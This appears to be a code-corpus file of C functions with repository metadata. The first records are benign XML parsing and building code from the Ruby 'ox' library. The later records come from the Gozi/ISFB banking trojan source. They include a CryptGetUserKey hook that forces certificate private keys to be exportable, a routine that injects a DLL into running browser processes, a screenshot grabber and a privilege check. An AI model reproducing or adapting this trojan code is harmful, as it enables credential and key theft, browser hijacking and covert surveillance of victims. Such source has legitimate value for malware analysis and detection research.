{"docstring": "// Entered after the \"<?\" sequence. Ready to read the rest.\n", "func_signal": "static void\nread_instruction(PInfo pi)", "code": "{\n    char\t\tcontent[1024];\n    struct _attrStack\tattrs;\n    char\t\t*attr_name;\n    char\t\t*attr_value;\n    char\t\t*target;\n    char\t\t*end;\n    char\t\tc;\n    char\t\t*cend;\n    int\t\t\tattrs_ok = 1;\n\n    *content = '\\0';\n    attr_stack_init(&attrs);\n    if (0 == (target = read_name_token(pi))) {\n\treturn;\n    }\n    end = pi->s;\n    if (0 == (cend = gather_content(pi->s, content, sizeof(content) - 1))) {\n\tset_error(&pi->err, \"processing instruction content too large or not terminated\", pi->str, pi->s);\n\treturn;\n    }\n    next_non_white(pi);\n    c = *pi->s;\n    *end = '\\0'; // terminate name\n    if ('?' != c) {\n\twhile ('?' != c) {\n\t    pi->last = 0;\n\t    if ('\\0' == *pi->s) {\n\t\tattr_stack_cleanup(&attrs);\n\t\tset_error(&pi->err, \"invalid format, processing instruction not terminated\", pi->str, pi->s);\n\t\treturn;\n\t    }\n\t    next_non_white(pi);\n\t    if (0 == (attr_name = read_name_token(pi))) {\n\t\tattr_stack_cleanup(&attrs);\n\t\treturn;\n\t    }\n\t    end = pi->s;\n\t    next_non_white(pi);\n\t    if ('=' != *pi->s++) {\n\t\tattrs_ok = 0;\n\t\tbreak;\n\t    }\n\t    *end = '\\0'; // terminate name\n\t    // read value\n\t    next_non_white(pi);\n\t    if (0 == (attr_value = read_quoted_value(pi))) {\n\t\tattr_stack_cleanup(&attrs);\n\t\treturn;\n\t    }\n\t    attr_stack_push(&attrs, attr_name, attr_value);\n\t    next_non_white(pi);\n\t    if ('\\0' == pi->last) {\n\t\tc = *pi->s;\n\t    } else {\n\t\tc = pi->last;\n\t    }\n\t}\n\tif ('?' == *pi->s) {\n\t    pi->s++;\n\t}\n    } else {\n\tpi->s++;\n    }\n    if (attrs_ok) {\n\tif ('>' != *pi->s++) {\n\t    attr_stack_cleanup(&attrs);\n\t    set_error(&pi->err, \"invalid format, processing instruction not terminated\", pi->str, pi->s);\n\t    return;\n\t}\n    } else {\n\tpi->s = cend + 1;\n    }\n    if (0 != pi->pcb->instruct) {\n\tif (attrs_ok) {\n\t    pi->pcb->instruct(pi, target, attrs.head, 0);\n\t} else {\n\t    pi->pcb->instruct(pi, target, attrs.head, content);\n\t}\n    }\n    attr_stack_cleanup(&attrs);\n}", "path": "ox/ext/ox/parse.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: doctype(text)\n *\n * Adds a DOCTYPE element to the XML string being formed.\n * - +text+ - (String) contents of the doctype\n */\n", "func_signal": "static VALUE\nbuilder_doctype(VALUE self, VALUE text)", "code": "{\n    Builder\tb = (Builder)DATA_PTR(self);\n\n    rb_check_type(text, T_STRING);\n    i_am_a_child(b, false);\n    append_indent(b);\n    buf_append_string(&b->buf, \"<!DOCTYPE \", 10);\n    b->col += 10;\n    b->pos += 10;\n    append_string(b, StringValuePtr(text), RSTRING_LEN(text), xml_element_chars, false);\n    buf_append(&b->buf, '>');\n    b->col++;\n    b->pos++;\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "//static void\tslot_print(Cache8 cache, sid_t key, unsigned int depth);\n", "func_signal": "void\nox_cache8_new(Cache8 *cache)", "code": "{\n    Bucket\t*b;\n    int\t\ti;\n\n    *cache = ALLOC(struct _cache8);\n    for (i = SLOT_CNT, b = (*cache)->buckets; 0 < i; i--, b++) {\n\tb->value = 0;\n    }\n}", "path": "ox/ext/ox/cache8.c", "commit_date": "2019-04-16 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/*\n * Document-class: Ox::Builder\n *\n * An XML builder.\n */\n", "func_signal": "void ox_init_builder(VALUE ox)", "code": "{\n    builder_class = rb_define_class_under(ox, \"Builder\", rb_cObject);\n    rb_define_module_function(builder_class, \"new\", builder_new, -1);\n    rb_define_module_function(builder_class, \"file\", builder_file, -1);\n    rb_define_module_function(builder_class, \"io\", builder_io, -1);\n    rb_define_method(builder_class, \"instruct\", builder_instruct, -1);\n    rb_define_method(builder_class, \"comment\", builder_comment, 1);\n    rb_define_method(builder_class, \"doctype\", builder_doctype, 1);\n    rb_define_method(builder_class, \"element\", builder_element, -1);\n    rb_define_method(builder_class, \"void_element\", builder_void_element, -1);\n    rb_define_method(builder_class, \"text\", builder_text, -1);\n    rb_define_method(builder_class, \"cdata\", builder_cdata, 1);\n    rb_define_method(builder_class, \"raw\", builder_raw, 1);\n    rb_define_method(builder_class, \"pop\", builder_pop, 0);\n    rb_define_method(builder_class, \"close\", builder_close, 0);\n    rb_define_method(builder_class, \"to_s\", builder_to_s, 0);\n    rb_define_method(builder_class, \"line\", builder_line, 0);\n    rb_define_method(builder_class, \"column\", builder_column, 0);\n    rb_define_method(builder_class, \"pos\", builder_pos, 0);\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: instruct(decl,options)\n *\n * Adds the top level <?xml?> element.\n *\n * - +decl+ - (String) 'xml' expected\n * - +options+ - (Hash) version or encoding\n */\n", "func_signal": "static VALUE\nbuilder_instruct(int argc, VALUE *argv, VALUE self)", "code": "{\n    Builder\tb = (Builder)DATA_PTR(self);\n\n    i_am_a_child(b, false);\n    append_indent(b);\n    if (0 == argc) {\n\tbuf_append_string(&b->buf, \"<?xml?>\", 7);\n\tb->col += 7;\n\tb->pos += 7;\n    } else {\n\tvolatile VALUE\tv;\n\n\tbuf_append_string(&b->buf, \"<?\", 2);\n\tb->col += 2;\n\tb->pos += 2;\n\tappend_sym_str(b, *argv);\n\tif (1 < argc && rb_cHash == rb_obj_class(argv[1])) {\n\t    int\tlen;\n\n\t    if (Qnil != (v = rb_hash_lookup(argv[1], ox_version_sym))) {\n\t\tif (rb_cString != rb_obj_class(v)) {\n\t\t    rb_raise(ox_parse_error_class, \":version must be a Symbol.\\n\");\n\t\t}\n\t\tlen = (int)RSTRING_LEN(v);\n\t\tbuf_append_string(&b->buf, \" version=\\\"\", 10);\n\t\tbuf_append_string(&b->buf, StringValuePtr(v), len);\n\t\tbuf_append(&b->buf, '\"');\n\t\tb->col += len + 11;\n\t\tb->pos += len + 11;\n\t    }\n\t    if (Qnil != (v = rb_hash_lookup(argv[1], ox_encoding_sym))) {\n\t\tif (rb_cString != rb_obj_class(v)) {\n\t\t    rb_raise(ox_parse_error_class, \":encoding must be a Symbol.\\n\");\n\t\t}\n\t\tlen = (int)RSTRING_LEN(v);\n\t\tbuf_append_string(&b->buf, \" encoding=\\\"\", 11);\n\t\tbuf_append_string(&b->buf, StringValuePtr(v), len);\n\t\tbuf_append(&b->buf, '\"');\n\t\tb->col += len + 12;\n\t\tb->pos += len + 12;\n\t\tstrncpy(b->encoding, StringValuePtr(v), sizeof(b->encoding));\n\t\tb->encoding[sizeof(b->encoding) - 1] = '\\0';\n\t    }\n\t    if (Qnil != (v = rb_hash_lookup(argv[1], ox_standalone_sym))) {\n\t\tif (rb_cString != rb_obj_class(v)) {\n\t\t    rb_raise(ox_parse_error_class, \":standalone must be a Symbol.\\n\");\n\t\t}\n\t\tlen = (int)RSTRING_LEN(v);\n\t\tbuf_append_string(&b->buf, \" standalone=\\\"\", 13);\n\t\tbuf_append_string(&b->buf, StringValuePtr(v), len);\n\t\tbuf_append(&b->buf, '\"');\n\t\tb->col += len + 14;\n\t\tb->pos += len + 14;\n\t    }\n\t}\n\tbuf_append_string(&b->buf, \"?>\", 2);\n\tb->col += 2;\n\tb->pos += 2;\n    }\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: as_sym()\n *\n * *return* value as an Symbol.\n */\n", "func_signal": "static VALUE\nsax_value_as_sym(VALUE self)", "code": "{\n    SaxDrive\tdr = DATA_PTR(self);\n\n    if ('\\0' == *dr->buf.str) {\n\treturn Qnil;\n    }\n    return str2sym(dr, dr->buf.str, 0);\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: comment(text)\n *\n * Adds a comment element to the XML string being formed.\n * - +text+ - (String) contents of the comment\n */\n", "func_signal": "static VALUE\nbuilder_comment(VALUE self, VALUE text)", "code": "{\n    Builder\tb = (Builder)DATA_PTR(self);\n\n    rb_check_type(text, T_STRING);\n    i_am_a_child(b, false);\n    append_indent(b);\n    buf_append_string(&b->buf, \"<!--\", 4);\n    b->col += 5;\n    b->pos += 5;\n    append_string(b, StringValuePtr(text), RSTRING_LEN(text), xml_element_chars, false);\n    buf_append_string(&b->buf, \"-->\", 3);\n    b->col += 5;\n    b->pos += 5;\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: as_time()\n *\n * *return* value as an Time.\n */\n", "func_signal": "static VALUE\nsax_value_as_time(VALUE self)", "code": "{\n    SaxDrive\tdr = DATA_PTR(self);\n    const char\t*str = dr->buf.str;\n    VALUE       t;\n\n    if ('\\0' == *str) {\n\treturn Qnil;\n    }\n    if (Qnil == (t = parse_double_time(str)) &&\n\tQnil == (t = parse_xsd_time(str))) {\n        VALUE       args[1];\n\n        /*printf(\"**** time parse\\n\"); */\n        *args = rb_str_new2(str);\n        t = rb_funcall2(ox_time_class, ox_parse_id, 1, args);\n    }\n    return t;\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: close()\n *\n * Closes the all elements and the document.\n */\n", "func_signal": "static VALUE\nbuilder_close(VALUE self)", "code": "{\n    bclose((Builder)DATA_PTR(self));\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "// Entered after the '<' and the first character after that. Returns stat\n// code.\n", "func_signal": "static char*\nread_element(PInfo pi)", "code": "{\n    struct _attrStack\tattrs;\n    const char\t\t*attr_name;\n    const char\t\t*attr_value;\n    char\t\t*name;\n    char\t\t*ename;\n    char\t\t*end;\n    char\t\tc;\n    long\t\telen;\n    int\t\t\thasChildren = 0;\n    int\t\t\tdone = 0;\n\n    attr_stack_init(&attrs);\n    if (0 == (ename = read_name_token(pi))) {\n\treturn 0;\n    }\n    end = pi->s;\n    elen = end - ename;\n    next_non_white(pi);\n    c = *pi->s;\n    *end = '\\0';\n    if ('/' == c) {\n\t// empty element, no attributes and no children\n\tpi->s++;\n\tif ('>' != *pi->s) {\n\t    attr_stack_cleanup(&attrs);\n\t    set_error(&pi->err, \"invalid format, element not closed\", pi->str, pi->s);\n\t    return 0;\n\t}\n\tpi->s++;\t/* past > */\n\tpi->pcb->add_element(pi, ename, attrs.head, hasChildren);\n\tpi->pcb->end_element(pi, ename);\n\n\tattr_stack_cleanup(&attrs);\n\treturn 0;\n    }\n    /* read attribute names until the close (/ or >) is reached */\n    while (!done) {\n\tif ('\\0' == c) {\n\t    if (pi->end <= pi->s) {\n\t\tbreak;\n\t    }\n\t    next_non_white(pi);\n\t    c = *pi->s;\n\t}\n\tpi->last = 0;\n\tswitch (c) {\n\tcase '\\0':\n\t    attr_stack_cleanup(&attrs);\n\t    set_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t    return 0;\n\tcase '/':\n\t    /* Element with just attributes. */\n\t    pi->s++;\n\t    if ('>' != *pi->s) {\n\t\tattr_stack_cleanup(&attrs);\n\t\tset_error(&pi->err, \"invalid format, element not closed\", pi->str, pi->s);\n\t\treturn 0;\n\t    }\n\t    pi->s++;\n\t    pi->pcb->add_element(pi, ename, attrs.head, hasChildren);\n\t    pi->pcb->end_element(pi, ename);\n\t    attr_stack_cleanup(&attrs);\n\n\t    return 0;\n\tcase '>':\n\t    /* has either children or a value */\n\t    pi->s++;\n\t    hasChildren = 1;\n\t    done = 1;\n\t    pi->pcb->add_element(pi, ename, attrs.head, hasChildren);\n\n\t    break;\n\tdefault:\n\t    /* Attribute name so it's an element and the attribute will be */\n\t    /* added to it. */\n\t    if (0 == (attr_name = read_name_token(pi))) {\n\t\tattr_stack_cleanup(&attrs);\n\t\treturn 0;\n\t    }\n\t    end = pi->s;\n\t    next_non_white(pi);\n\t    if ('=' != *pi->s++) {\n\t\tif (TolerantEffort == pi->options->effort) {\n\t\t    pi->s--;\n\t\t    pi->last = *pi->s;\n\t\t    *end = '\\0'; /* terminate name */\n\t\t    attr_value = \"\";\n\t\t    attr_stack_push(&attrs, attr_name, attr_value);\n\t\t    break;\n\t\t} else {\n\t\t    attr_stack_cleanup(&attrs);\n\t\t    set_error(&pi->err, \"invalid format, no attribute value\", pi->str, pi->s);\n\t\t    return 0;\n\t\t}\n\t    }\n\t    *end = '\\0'; /* terminate name */\n\t    /* read value */\n\t    next_non_white(pi);\n\t    if (0 == (attr_value = read_quoted_value(pi))) {\n\t\treturn 0;\n\t    }\n\t    if (pi->options->convert_special && 0 != strchr(attr_value, '&')) {\n\t\tif (0 != collapse_special(pi, (char*)attr_value) || err_has(&pi->err)) {\n\t\t    attr_stack_cleanup(&attrs);\n\t\t    return 0;\n\t\t}\n\t    }\n\t    attr_stack_push(&attrs, attr_name, attr_value);\n\t    break;\n\t}\n\tif ('\\0' == pi->last) {\n\t    c = '\\0';\n\t} else {\n\t    c = pi->last;\n\t    pi->last = '\\0';\n\t}\n    }\n    if (hasChildren) {\n\tchar\t*start;\n\tint\tfirst = 1;\n\n\tdone = 0;\n\t/* read children */\n\twhile (!done) {\n\t    start = pi->s;\n\t    next_non_white(pi);\n\t    if (OffSkip == pi->options->skip && start < pi->s && '<' == *pi->s) {\n\t\tc = *pi->s;\n\t\t*pi->s = '\\0';\n\t\tpi->pcb->add_text(pi, start, 1);\n\t\t*pi->s = c;\n\t    }\n\t    c = *pi->s++;\n\t    if ('\\0' == c) {\n\t\tattr_stack_cleanup(&attrs);\n\t\tset_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t\treturn 0;\n\t    }\n\t    if ('<' == c) {\n\t\tchar\t*slash;\n\n\t\tswitch (*pi->s) {\n\t\tcase '!':\t/* better be a comment or CDATA */\n\t\t    pi->s++;\n\t\t    if ('-' == *pi->s && '-' == *(pi->s + 1)) {\n\t\t\tpi->s += 2;\n\t\t\tread_comment(pi);\n\t\t    } else if ((TolerantEffort == pi->options->effort) ?\n\t\t\t       0 == strncasecmp(\"[CDATA[\", pi->s, 7) :\n\t\t\t       0 == strncmp(\"[CDATA[\", pi->s, 7)) {\n\t\t\tpi->s += 7;\n\t\t\tread_cdata(pi);\n\t\t    } else {\n\t\t\tattr_stack_cleanup(&attrs);\n\t\t\tset_error(&pi->err, \"invalid format, invalid comment or CDATA format\", pi->str, pi->s);\n\t\t\treturn 0;\n\t\t    }\n\t\t    break;\n\t\tcase '?':\t/* processing instruction */\n\t\t    pi->s++;\n\t\t    read_instruction(pi);\n\t\t    break;\n\t\tcase '/':\n\t\t    slash = pi->s;\n\t\t    pi->s++;\n\t\t    if (0 == (name = read_name_token(pi))) {\n\t\t\tattr_stack_cleanup(&attrs);\n\t\t\treturn 0;\n\t\t    }\n\t\t    end = pi->s;\n\t\t    next_non_white(pi);\n\t\t    c = *pi->s;\n\t\t    *end = '\\0';\n\t\t    if (0 != ((TolerantEffort == pi->options->effort) ? strcasecmp(name, ename) : strcmp(name, ename))) {\n\t\t\tattr_stack_cleanup(&attrs);\n\t\t\tif (TolerantEffort == pi->options->effort) {\n\t\t\t    pi->pcb->end_element(pi, ename);\n\t\t\t    return name;\n\t\t\t} else {\n\t\t\t    set_error(&pi->err, \"invalid format, elements overlap\", pi->str, pi->s);\n\t\t\t    return 0;\n\t\t\t}\n\t\t    }\n\t\t    if ('>' != c) {\n\t\t\tattr_stack_cleanup(&attrs);\n\t\t\tset_error(&pi->err, \"invalid format, element not closed\", pi->str, pi->s);\n\t\t\treturn 0;\n\t\t    }\n\t\t    if (first && start != slash - 1) {\n\t\t\t// Some white space between start and here so add as\n\t\t\t// text after checking skip.\n\t\t\t*(slash - 1) = '\\0';\n\t\t\tswitch (pi->options->skip) {\n\t\t\tcase CrSkip: {\n\t\t\t    char\t*s = start;\n\t\t\t    char\t*e = start;\n\n\t\t\t    for (; '\\0' != *e; e++) {\n\t\t\t\tif ('\\r' != *e) {\n\t\t\t\t    *s++ = *e;\n\t\t\t\t}\n\t\t\t    }\n\t\t\t    *s = '\\0';\n\t\t\t    break;\n\t\t\t}\n\t\t\tcase SpcSkip:\n\t\t\t    *start = '\\0';\n\t\t\t    break;\n\t\t\tcase NoSkip:\n\t\t\tcase OffSkip:\n\t\t\tdefault:\n\t\t\t    break;\n\t\t\t}\n\t\t\tif ('\\0' != *start) {\n\t\t\t    pi->pcb->add_text(pi, start, 1);\n\t\t\t}\n\t\t    }\n\t\t    pi->s++;\n\t\t    pi->pcb->end_element(pi, ename);\n\t\t    attr_stack_cleanup(&attrs);\n\t\t    return 0;\n\t\tcase '\\0':\n\t\t    attr_stack_cleanup(&attrs);\n\t\t    if (TolerantEffort == pi->options->effort) {\n\t\t\treturn 0;\n\t\t    } else {\n\t\t\tset_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t\t\treturn 0;\n\t\t    }\n\t\tdefault:\n\t\t    first = 0;\n\t\t    /* a child element */\n\t\t    // Child closed with mismatched name.\n\t\t    if (0 != (name = read_element(pi))) {\n\t\t\tattr_stack_cleanup(&attrs);\n\n\t\t\tif (0 == ((TolerantEffort == pi->options->effort) ? strcasecmp(name, ename) : strcmp(name, ename))) {\n\t\t\t    pi->s++;\n\t\t\t    pi->pcb->end_element(pi, ename);\n\t\t\t    return 0;\n\t\t\t} else { // not the correct element yet\n\t\t\t    pi->pcb->end_element(pi, ename);\n\t\t\t    return name;\n\t\t\t}\n\t\t    } else if (err_has(&pi->err)) {\n\t\t\treturn 0;\n\t\t    }\n\t\t    break;\n\t\t}\n\t    } else {\t/* read as TEXT */\n\t\tpi->s = start;\n\t\t/*pi->s--; */\n\t\tread_text(pi);\n\t\t/*read_reduced_text(pi); */\n\n\t\t/* to exit read_text with no errors the next character must be < */\n\t\tif ('/' == *(pi->s + 1) &&\n\t\t    0 == ((TolerantEffort == pi->options->effort) ? strncasecmp(ename, pi->s + 2, elen) : strncmp(ename, pi->s + 2, elen)) &&\n\t\t    '>' == *(pi->s + elen + 2)) {\n\n\t\t    /* close tag after text so treat as a value */\n\t\t    pi->s += elen + 3;\n\t\t    pi->pcb->end_element(pi, ename);\n\t\t    attr_stack_cleanup(&attrs);\n\t\t    return 0;\n\t\t}\n\t    }\n\t}\n    }\n    attr_stack_cleanup(&attrs);\n    return 0;\n}", "path": "ox/ext/ox/parse.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: as_f()\n *\n * *return* value as an Float.\n */\n", "func_signal": "static VALUE\nsax_value_as_f(VALUE self)", "code": "{\n    SaxDrive\tdr = DATA_PTR(self);\n\n    if ('\\0' == *dr->buf.str) {\n\treturn Qnil;\n    }\n    return rb_float_new(strtod(dr->buf.str, 0));\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: void_element(name,attributes)\n *\n * Adds an void element with the name and attributes provided.\n *\n * - +name+ - (String) name of the element\n * - +attributes+ - (Hash) of the element\n */\n", "func_signal": "static VALUE\nbuilder_void_element(int argc, VALUE *argv, VALUE self)", "code": "{\n    Builder\tb = (Builder)DATA_PTR(self);\n    const char\t*name;\n    long\tlen;\n\n    if (1 > argc) {\n\trb_raise(ox_arg_error_class, \"missing element name\");\n    }\n    i_am_a_child(b, false);\n    append_indent(b);\n    switch (rb_type(*argv)) {\n    case T_STRING:\n\tname = StringValuePtr(*argv);\n\tlen = RSTRING_LEN(*argv);\n\tbreak;\n    case T_SYMBOL:\n\tname = rb_id2name(SYM2ID(*argv));\n\tlen = strlen(name);\n\tbreak;\n    default:\n\trb_raise(ox_arg_error_class, \"expected a Symbol or String for an element name\");\n\tbreak;\n    }\n    buf_append(&b->buf, '<');\n    b->col++;\n    b->pos++;\n    append_string(b, name, len, xml_element_chars, false);\n    if (1 < argc && T_HASH == rb_type(argv[1])) {\n\trb_hash_foreach(argv[1], append_attr, (VALUE)b);\n    }\n    buf_append_string(&b->buf, \">\", 1);\n    b->col++;;\n    b->pos++;\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "//\n//\tChecks current process toket if there's an elevation required.\n//\tRequest UAC elevation if needed.\n//\t\n", "func_signal": "BOOL IsElevated(\n\tPULONG\tpIntegrityLevel\n\t)", "code": "{\n\tUCHAR VersionHi = LOBYTE(LOWORD(g_SystemVersion));\n\tBOOL bElevated = TRUE;\n\tPTOKEN_MANDATORY_LABEL pTML;\n\tULONG IntegrityLevel = SECURITY_MANDATORY_MEDIUM_RID;\n\n\t// Check if there's our module path resolved and OS version is higher then 5\n\tif (VersionHi > 5)\n\t{\n\t\t// For Vista and higher:\n\t\t// Checking for UAC elevated token\n\t\tHANDLE\thToken;\n\t\tULONG\tbSize;\n\n\t\tbElevated = FALSE;\n\t\tif (OpenProcessToken(GetCurrentProcess(), READ_CONTROL | TOKEN_QUERY, &hToken))\n\t\t{\n\t\t\tGetTokenInformation(hToken, TokenElevation, &bElevated, sizeof(BOOL), &bSize);\n\n\t\t\tbSize = 0;\n\t\t\tGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &bSize);\n\t\t\tif (bSize && (pTML = AppAlloc(bSize)))\n\t\t\t{\n\t\t\t\tif (GetTokenInformation(hToken, TokenIntegrityLevel, pTML, bSize, &bSize))\n\t\t\t\t\tIntegrityLevel = *GetSidSubAuthority(pTML->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTML->Label.Sid) - 1));\n\t\t\t\tAppFree(pTML);\n\t\t\t}\n\t\t\tCloseHandle(hToken);\n\t\t}\t// if (OpenProcessToken(GetCurrentProcess(), READ_CONTROL | TOKEN_QUERY, &hToken))\n\t}\t// if (VersionHi > 5)\n\n\t*pIntegrityLevel = IntegrityLevel;\n\n\treturn(bElevated);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tObtains encoder class id and creats a screenshot of the specified window into a GIF stream\n//\n", "func_signal": "static WINERROR GetScreenShot(\n\tHWND\t\thWnd, \n\tLPSTREAM\tpStream\n\t)", "code": "{\n\tWINERROR Status;\n\n\tif (g_gifCLSID.Data1 || (Status = ScrGetEncoderClsid(wczImageGif, &g_gifCLSID)) == NO_ERROR)\n\t{\n\t\t// Waiting for 3 seconds to completely download the entire page\n\t\tStatus = WaitForSingleObject(g_AppShutdownEvent, 3000);\n\n\t\tif (Status == WAIT_TIMEOUT)\n\t\t\t// Generating a screenshot\n\t\t\tStatus = ScrMakeScreenshot(hWnd, NULL, pStream, &g_gifCLSID);\n\t}\n\n\treturn(Status);\n}", "path": "malware/windows/gozi-isfb/client/others.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tReleases the specified handle record, frees memory.\n//\n", "func_signal": "static VOID HandleFree(\n\tPHANDLE_RECORD\tpHRec\n\t)", "code": "{\n\tASSERT_HANDLE_RECORD(pHRec);\n\thFree(pHRec);\n}", "path": "malware/windows/gozi-isfb/Handle/handle.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tHook function.\n//\tReceives handle to a user's key container and marks the key exportable.\n//\n", "func_signal": "BOOL WINAPI my_CryptGetUserKey(HCRYPTPROV hProv, DWORD dwKeySpec, HCRYPTKEY *phUserKey)", "code": "{\n\tBOOL Ret;\n\n\tENTER_HOOK();\n\t\t\n\tRet = CryptGetUserKey(hProv, dwKeySpec, phUserKey);\n\n\tif (Ret && (dwKeySpec != CERT_NCRYPT_KEY_SPEC))\n\t{\n\t\t__try\n\t\t{\n\t\t\t// Mark the certificate's private key as exportable and archivable \n\t\t\t*(PULONG_PTR)(*(PULONG_PTR)(*(PULONG_PTR) \n#ifdef\t_WIN64 \n\t\t\t\t(*phUserKey + 0x58) ^ 0xE35A172CD96214A0) + 0x0C) \n#else \n\t\t\t\t(*phUserKey + 0x2C) ^ 0xE35A172C) + 0x08) \n#endif \n\t\t\t\t|= CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE; \n\t\t}\n\t\t__except(EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\tRet = FALSE;\n\t\t}\n\t}\t// if (Ret && (dwKeySpec != CERT_NCRYPT_KEY_SPEC))\n\n\tLEAVE_HOOK();\n\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/client/certs.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tEnumerate all processes and inject DLL into every browser process.\n//\n", "func_signal": "static VOID EnumProcessAndInjectDll(\n\tLPTSTR\tDllPath,\n\tULONG\tFlags\n\t)", "code": "{\n\tPROCESSENTRY32\tProcess = {0};\n\tHANDLE\thSnapshot;\n\t\n\tProcess.dwSize = sizeof(PROCESSENTRY32);\n\thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapshot != INVALID_HANDLE_VALUE)\n\t{\n\t\tif (Process32First(hSnapshot, &Process))\n\t\t{\n\t\t\tdo \n\t\t\t{\n\t\t\t\tif (Process.th32ProcessID != g_CurrentProcessId)\n\t\t\t\t{\n\t\t\t\t\tULONG NameHash;\n\t\t\t\t\tstrupr((LPTSTR)&Process.szExeFile);\n\n\t\t\t\t\tNameHash = (Crc32((LPTSTR)&Process.szExeFile, lstrlen((LPTSTR)&Process.szExeFile)) ^ g_CsCookie);\n\n\t\t\t\t\tif (NameHash == HOST_IE || NameHash == HOST_FF || NameHash == HOST_CR || NameHash == HOST_OP)\n\t\t\t\t\t{\n\t\t\t\t\t\tDbgPrint(\"ISFB: Injecting Client DLL to a predefined host process %s\\n\", (LPTSTR)&Process.szExeFile);\n#if _INJECT_AS_IMAGE\n\t\t\t\t\t\tProcessInjectDllWithThread(Process.th32ProcessID);\n\t\t\t\t\t\tUNREFERENCED_PARAMETER(DllPath);\n\t\t\t\t\t\tUNREFERENCED_PARAMETER(Flags);\n#else\n\t\t\t\t\t\tPsSupInjectDll(Process.th32ProcessID, DllPath, Flags);\n#endif\n\t\t\t\t\t}\n\t\t\t\t}\t// if (Process.th32ProcessID != g_CurrentProcessId)\n\t\t\t} while (Process32Next(hSnapshot, &Process));\n\t\t}\t// if (Process32First(hSnapshot, &Process))\n\t\tCloseHandle(hSnapshot);\n\t}\t// \tif (hSnapshot != INVALID_HANDLE_VALUE)\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tReturns TRUE if the specified content type string contains one of supported values\n//\n", "func_signal": "BOOL CheckContentType(\n\tLPTSTR\tpContentType\n\t)", "code": "{\n\tBOOL bRet = FALSE;\n\n\tif (\n\t\tStrStrI(pContentType, szText) ||\n\t\tStrStrI(pContentType, szHtml) ||\n\t\tStrStrI(pContentType, szImage) ||\n\t\tStrStrI(pContentType, szJson) ||\n\t\tStrStrI(pContentType, szJavascript)\n\t\t)\n\t\tbRet = TRUE;\n\n\treturn(bRet);\n}", "path": "malware/windows/gozi-isfb/client/others.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
